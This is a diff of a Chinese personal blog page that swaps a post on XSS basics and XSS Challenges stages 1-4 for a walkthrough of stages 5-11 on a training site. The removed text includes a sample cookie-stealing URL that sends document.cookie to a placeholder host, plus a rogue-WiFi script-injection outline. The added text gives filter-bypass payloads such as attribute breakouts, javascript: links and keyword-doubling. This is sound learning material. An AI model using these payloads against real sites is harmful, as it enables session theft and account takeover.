@@ -6,22 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>初识XSS攻击 XSS Challenges闯关1-4 | Joner的博客</title>
+  <title>XSS challengs5-11通过过程 | Joner的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="XSS定义 XSS分类 XSS靶场1-4关 总结">
-<meta name="keywords" content="xss,xss challenges">
+  <meta name="description" content="XSS challenges下面主要记录的是 XSS challenges 第5-11关的通关过程，其中一些步骤在之前写过，所以写的比较简略。">
+<meta name="keywords" content="XSS,XSS challenges">
 <meta property="og:type" content="article">
-<meta property="og:title" content="初识XSS攻击 XSS Challenges闯关1-4">
-<meta property="og:url" content="http://yoursite.com/2019/03/30/初识XSS攻击-XSS-Challenges闯关1-4/index.html">
+<meta property="og:title" content="XSS challengs5-11通过过程">
+<meta property="og:url" content="http://yoursite.com/2019/03/31/XSS-challengs5-11通过过程/index.html">
 <meta property="og:site_name" content="Joner的博客">
-<meta property="og:description" content="XSS定义 XSS分类 XSS靶场1-4关 总结">
+<meta property="og:description" content="XSS challenges下面主要记录的是 XSS challenges 第5-11关的通关过程，其中一些步骤在之前写过，所以写的比较简略。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2019/03/30/初识XSS攻击-XSS-Challenges闯关1-4/D:/Entertainment/STU/Bolg/source/_posts/初识XSS攻击-XSS-Challenges闯关1-4/dom.png">
-<meta property="og:updated_time" content="2019-03-30T07:46:09.656Z">
+<meta property="og:updated_time" content="2019-03-31T12:00:22.522Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="初识XSS攻击 XSS Challenges闯关1-4">
-<meta name="twitter:description" content="XSS定义 XSS分类 XSS靶场1-4关 总结">
-<meta name="twitter:image" content="http://yoursite.com/2019/03/30/初识XSS攻击-XSS-Challenges闯关1-4/D:/Entertainment/STU/Bolg/source/_posts/初识XSS攻击-XSS-Challenges闯关1-4/dom.png">
+<meta name="twitter:title" content="XSS challengs5-11通过过程">
+<meta name="twitter:description" content="XSS challenges下面主要记录的是 XSS challenges 第5-11关的通关过程，其中一些步骤在之前写过，所以写的比较简略。">
   
     <link rel="alternative" href="/atom.xml" title="Joner的博客" type="application/atom+xml">
   
@@ -151,96 +149,72 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-初识XSS攻击-XSS-Challenges闯关1-4" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-XSS-challengs5-11通过过程" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      初识XSS攻击 XSS Challenges闯关1-4
+      XSS challengs5-11通过过程
     </h1>
   
 
         
-        <a href="/2019/03/30/初识XSS攻击-XSS-Challenges闯关1-4/" class="archive-article-date">
-  	<time datetime="2019-03-30T07:34:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
+        <a href="/2019/03/31/XSS-challengs5-11通过过程/" class="archive-article-date">
+  	<time datetime="2019-03-31T11:59:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-31</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <ul>
-<li>XSS定义</li>
-<li>XSS分类</li>
-<li>XSS靶场1-4关</li>
-<li>总结<a id="more"></a>
-</li>
-</ul>
-<h3 id="XSS定义"><a href="#XSS定义" class="headerlink" title="XSS定义"></a>XSS定义</h3><p>XSS, 即为（Cross Site Scripting）, 中文名为跨站脚本, 是发生在<strong>目标用户的浏览器</strong>层面上的，当渲染DOM树的过程成发生了<strong>不在预期内</strong>执行的JS代码时，就发生了XSS攻击。</p>
-<p>跨站脚本的重点不在‘跨站’上，而在于‘脚本’上。大多数XSS攻击的主要方式是嵌入一段远程或者第三方域上的JS代码。实际上是在目标网站的作用域下执行了这段js代码。</p>
-<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><blockquote>
-<ul>
-<li><p>反射型XSS</p>
-</li>
-<li><p>存储型XSS</p>
-</li>
-<li><p>DOM XSS</p>
-</li>
-</ul>
-</blockquote>
-<h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>例如在搜索框中搜索东西时，找到或者找不到时将显示提交的名称，在这时，如果提交的时候提交的时构造好的语句，并且网站对一些符号和关键词的过滤不严格，甚至不过滤，就会导致构造的语句在前端执行，例如语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;handsome boy&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>但这只是在自己网页上而已，但如果将构造好的查询语句通过某种方式进行群发，让别人点击，就可能获得他人的<code>cookies</code>,例如如下语句，仅是举例</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxxxxx.cn/search?name=&lt;script&gt;document.location=&apos;http://xxx/get?cookie=&apos;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><p>这种xss攻击的危害性更大，能够通过发表含有恶意跨站脚本的帖子或者文章，将其存储到服务器中，每当用户访问这个帖子或者文章时，就能触发，例如将这个帖子进行转发，这样就成为了XSS蠕虫，早在2011年，新浪微博就曾出现过一次比较大型的XSS攻击事件，通过使用户自动转发和发私信等方式进行传播。这也将可以将能够获取<code>cookies</code>的脚本发表在留言板中，当管理员查看留言时，就能获得他的<code>cookies</code>,从而获得管理员账号登陆的权限。</p>
-<h4 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h4><p>基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。</p>
-<p><strong>例子1：</strong></p>
-<p>1.提供一个免费的wifi。</p>
-<p>2.开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。</p>
-<p>3.之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。</p>
-<p>4.收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。</p>
-<p>5.当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。</p>
-<p><img src="/2019/03/30/初识XSS攻击-XSS-Challenges闯关1-4/D:/Entertainment\STU\Bolg\source\_posts\初识XSS攻击-XSS-Challenges闯关1-4\dom.png" alt="dom"></p>
-<h3 id="XSS练习靶场"><a href="#XSS练习靶场" class="headerlink" title="XSS练习靶场"></a>XSS练习靶场</h3><blockquote>
-<p><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">地址</a></p>
-</blockquote>
-<p>这个靶场主要是让你了解集中简单的XSS语句的构造方式，通过插入网站中给定的语句来判定是否注入成功。</p>
-<h4 id="stage-1"><a href="#stage-1" class="headerlink" title="stage #1"></a><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">stage #1</a></h4><p>首先输入123，点击search进行查看，确定回显的位置和标签，使用浏览器的F12审查元素功能，找到页面中123的位置，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;123&quot;</span><br></pre></td></tr></table></figure>
-<p>于是构造xss攻击语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>点击search后发现页面出现弹窗，于是将中间的js代码改成网站中所给的<code></code>alert(document.domain);`，点击search后在页面下方会出现下一关的地址。</p>
-<h4 id="stage-2"><a href="#stage-2" class="headerlink" title="stage #2"></a><a href="http://xss-quiz.int21h.jp/stage2.php?sid=ca40a16314b94dabc527cef04aa132105ef2c643" target="_blank" rel="noopener">stage #2</a></h4><p>刚开始的步骤和上面的一样，找到123位置的标签</p>
-<p>通过闭合相关的标签来实现执行js语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&quot;ss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>将中间的<code>alert(&quot;ss&quot;)</code>改为<code>alert(document.domain);</code>就可以得到下一关的地址</p>
-<h4 id="stage-3"><a href="#stage-3" class="headerlink" title="stage #3"></a><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=beb156da0689524c947e52bbf32deaf71cc45242" target="_blank" rel="noopener">stage #3</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;123&quot;</span><br><span class="line">in</span><br><span class="line">Japan</span><br></pre></td></tr></table></figure>
-<p>构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script&gt;alert(&quot;sss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>发现并没用什么作用，然后注意到，这个123 后面带着一个国家的字符串是和搜索内容同时提交的，因此可以通过抓包，修改包内容后提价来实现xss攻击，这里使用 burpsuite</p>
-<p>拦截后发现网页提交的内容为<code>p1=123&amp;p2=Japan</code>，这里p1的值前面已经试过，再试一试修改p2的值，</p>
-<p>将p2的值改为如下值，会发现出现弹窗</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;sss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>修改js语句即可获得下一关地址</p>
-<h4 id="stage-4"><a href="#stage-4" class="headerlink" title="stage #4"></a><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=e1ed8cd1da454cd7c1ef033351f27a4407e85eb7" target="_blank" rel="noopener">stage #4</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;123&quot;</span><br><span class="line">in</span><br><span class="line">Japan</span><br></pre></td></tr></table></figure>
-<p>两个地方都修改试一试,但是拦截后出现了一个p3，并且它的值为hackme，因此推测修改这个可以。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p1=&quot;&lt;script&gt;alert(&quot;sss&quot;)&lt;/script&gt;</span><br><span class="line">p2=&lt;script&gt;alert(&quot;sss&quot;)&lt;/script&gt;</span><br><span class="line">p3=&lt;script&gt;alert(&quot;sss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>但是修改后并没有什么事情发生，然后返回去看网页的代码，发现了一行隐藏属性</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;p3&quot; value=&quot;hackme&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>所以修改p3的值为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&quot;sss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>出现了 弹窗，修改js语句获得下一<a href="http://xss-quiz.int21h.jp/stage--5.php?sid=a7db383ee4c336fe3151d2e5be674219c5efdf13" target="_blank" rel="noopener">地址</a></p>
-<h3 id="XSS总结"><a href="#XSS总结" class="headerlink" title="XSS总结"></a>XSS总结</h3><p>XSS攻击的主要特点就是使用各种方法在目标网站上执行自己的脚本语句，然后通过脚本中的各种命令，来实现自己想要的结果。</p>
-<blockquote>
-<ul>
-<li><p><a href="http://www.cnblogs.com/unclekeith/p/7750681.html" target="_blank" rel="noopener">前端安全指XSS</a></p>
-</li>
-<li><p><a href="https://www.cnblogs.com/index-html/p/wifi_hijack_3.html" target="_blank" rel="noopener">Wifi-流量劫持-js脚本缓存病毒</a></p>
-</li>
-</ul>
-</blockquote>
+        <h2 id="XSS-challenges"><a href="#XSS-challenges" class="headerlink" title="XSS challenges"></a>XSS challenges</h2><p>下面主要记录的是 XSS challenges 第5-11关的通关过程，其中一些步骤在之前写过，所以写的比较简略。</p>
+<a id="more"></a>
+<h3 id="stage-5"><a href="#stage-5" class="headerlink" title="stage #5"></a><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=a7db383ee4c336fe3151d2e5be674219c5efdf13" target="_blank" rel="noopener">stage #5</a></h3><p>回显搜索结果处的标签为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">maxlength</span>=<span class="string">"15"</span> <span class="attr">size</span>=<span class="string">"30"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>尝试构造</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert("sss")</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输入时发现只能输入15个字符，所以修改<code>maxlength</code>的值，这个是限制输入框中字符的最大数量值，这里将它的值改为100，再输入后提交，出现弹框，修改js语句，获得下一关地址。</p>
+<h3 id="stage-6"><a href="#stage-6" class="headerlink" title="stage #6"></a><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=97c56f4090765853dd5c6d22383fd4ca89a96fc6" target="_blank" rel="noopener">stage #6</a></h3><p>回显搜索结果处的标签为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>尝试构造</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert("sss")</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>提交后没有反应，查看标签处的内容</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">""</span> &amp;<span class="attr">gt</span>;&amp;<span class="attr">lt</span>;<span class="attr">script</span>&amp;<span class="attr">gt</span>;<span class="attr">alert</span>("<span class="attr">sss</span>")&amp;<span class="attr">lt</span>;=<span class="string">""</span> <span class="attr">script</span>&amp;<span class="attr">gt</span>;"=<span class="string">""</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现&lt; &gt;被过滤了，所以使用新的xss攻击语句</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" onclick=alert(document.domain) id="a</span><br></pre></td></tr></table></figure>
+<p>这个会在提交后，点击搜索框时运行，点击后出现下一关的地址。</p>
+<h3 id="stage-7"><a href="#stage-7" class="headerlink" title="stage #7"></a><a href="http://xss-quiz.int21h.jp/stage07.php?sid=c85097c5d4a2d1287ddab0817c7252f36462dad8" target="_blank" rel="noopener">stage #7</a></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>尝试使用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" onclick=alert("sss") id="a</span><br></pre></td></tr></table></figure>
+<p>点击搜索框，获得下一关的地址</p>
+<h3 id="stage-8"><a href="#stage-8" class="headerlink" title="stage #8"></a><a href="http://xss-quiz.int21h.jp/stage008.php?sid=c33f00522deef0398a2911b64d8ea6597836912f" target="_blank" rel="noopener">stage #8</a></h3><p>这一关输入搜索内容后会转换为<code>url</code>地址，标签处的内容为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"123"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span>"<span class="tag">&lt;</span></span><br></pre></td></tr></table></figure>
+<p>这里的搜索结果放在<code>&lt;a&gt;</code>标签中，这里利用javascript:伪协议在a标签的使用,点击链接后，会执行相应语句，</p>
+<p>所以输入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert("sss")</span><br></pre></td></tr></table></figure>
+<p>更改js语句，获得下一关的地址</p>
+<h3 id="stage-9"><a href="#stage-9" class="headerlink" title="stage #9"></a><a href="http://xss-quiz.int21h.jp/stage_09.php?sid=a598b00466af6da5be82571504f35feda607285c" target="_blank" rel="noopener">stage #9</a></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"charset"</span> <span class="attr">value</span>=<span class="string">"euc-jp"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>尝试修改p1和下面那个隐藏的输入框的值，没有任何反应，尝试抓包，发现提交两个值<code>p1=1&amp;charset=euc-jp</code></p>
+<p>所以尝试修改<code>charset</code>的值，试了之后也不行，查网上的一些解法，说是需要使用IE7 环境 UTF-7编码。</p>
+<p>这里没继续尝试，因为IE7已经是很久前的版本了，在控制台输入 <code>alert(document.domain);</code>得到下一关地址</p>
+<h3 id="stage-10"><a href="#stage-10" class="headerlink" title="stage # 10"></a><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=f561b6546dddb613477defb74f2a1b1159ea657d" target="_blank" rel="noopener">stage # 10</a></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"12"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后直接输入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert("sss")</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>直接出现了弹窗，感觉有点简单，之后修改语句为 <code>alert(document.domain);</code>果然出现了问题，页面没有出现下一关地址，剩下了<code>&gt;&lt;script&gt;alert(document.);&lt;/script&gt;</code>可能是过滤了关键字，缺少了domain，这道题的提示是<code>s/domain//g;</code></p>
+<p>这应该是正则表达式，替换domain为空，所以使用双写绕过试试</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" onclick=alert(document.domdomainain);//</span><br></pre></td></tr></table></figure>
+<p>获得下一关的地址</p>
+<h3 id="stage-11"><a href="#stage-11" class="headerlink" title="stage #11"></a><a href="http://xss-quiz.int21h.jp/stage11th.php?sid=f0bffd6a02f65762180242616c887ba677f247d5" target="_blank" rel="noopener">stage #11</a></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>尝试构造</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert("sss")</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">以及</span><br><span class="line">" onclick=alert("sss");//</span><br></pre></td></tr></table></figure>
+<p>提交后的内容为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;<span class="name">xscript</span>&gt;</span>alert(</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onxxx</span>=<span class="string">"alert(&amp;quot;sss&amp;quot;);//&amp;quot;"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到这里对关键词语进行了处理，这一关的提示是<code>&quot;s/script/xscript/ig;&quot; and &quot;s/on[a-z]+=/onxxx=/ig;&quot; and &quot;s/style=/stxxx=/ig;&quot;</code>可以看出对<code>script</code>、<code>on事件</code>、<code>style</code>等进行了处理，,于是想到将某个字符转换为unicode编码</p>
+<p>,或者插入<code>&amp;#x09;</code>不可见字符，并且使用<code>&lt;a&gt;</code>标签，于是构造这样的payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascr&amp;#09;ipt:alert(document.domain);"</span>&gt;</span>12<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>获得下一关<a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=2b8d7ade9b1ca3e8251e407d50aca3a52d176145" target="_blank" rel="noopener">地址</a></p>
 
       
 
@@ -280,11 +254,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">xss</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XSS</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">xss challenges</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">XSS challenges</a>
         		</li>
       		
 		</ul>
@@ -340,7 +314,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/30/初识XSS攻击-XSS-Challenges闯关1-4/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/31/XSS-challengs5-11通过过程/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -354,18 +328,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/03/31/XSS注入常用语句/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          XSS注入常用语句
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/03/29/sqli-labs-6-7-布尔型盲注-延时注入/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">sqli-labs 6-7 布尔型盲注 延时注入</div>
+    <a href="/2019/03/31/XSS注入常用语句/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">XSS注入常用语句</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -392,7 +357,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS定义"><span class="toc-number">1.</span> <span class="toc-text">XSS定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分类"><span class="toc-number">2.</span> <span class="toc-text">分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#反射型XSS"><span class="toc-number">2.1.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#存储型xss"><span class="toc-number">2.2.</span> <span class="toc-text">存储型xss</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM-XSS"><span class="toc-number">2.3.</span> <span class="toc-text">DOM XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS练习靶场"><span class="toc-number">3.</span> <span class="toc-text">XSS练习靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-1"><span class="toc-number">3.1.</span> <span class="toc-text">stage #1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-2"><span class="toc-number">3.2.</span> <span class="toc-text">stage #2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-3"><span class="toc-number">3.3.</span> <span class="toc-text">stage #3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-4"><span class="toc-number">3.4.</span> <span class="toc-text">stage #4</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS总结"><span class="toc-number">4.</span> <span class="toc-text">XSS总结</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-challenges"><span class="toc-number">1.</span> <span class="toc-text">XSS challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-5"><span class="toc-number">1.1.</span> <span class="toc-text">stage #5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-6"><span class="toc-number">1.2.</span> <span class="toc-text">stage #6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-7"><span class="toc-number">1.3.</span> <span class="toc-text">stage #7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-8"><span class="toc-number">1.4.</span> <span class="toc-text">stage #8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-9"><span class="toc-number">1.5.</span> <span class="toc-text">stage #9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-10"><span class="toc-number">1.6.</span> <span class="toc-text">stage # 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-11"><span class="toc-number">1.7.</span> <span class="toc-text">stage #11</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -438,8 +403,8 @@
      
       <script type="text/javascript">
         var gitment = new Gitment({
-			  id: '初识XSS攻击 XSS Challenges闯关1-4',
-			  title: '初识XSS攻击 XSS Challenges闯关1-4',
+			  id: 'XSS challengs5-11通过过程',
+			  title: 'XSS challengs5-11通过过程',
 			  owner: 'joner11234',
 			  repo: 'joner11234.github.io',
 			  oauth: {
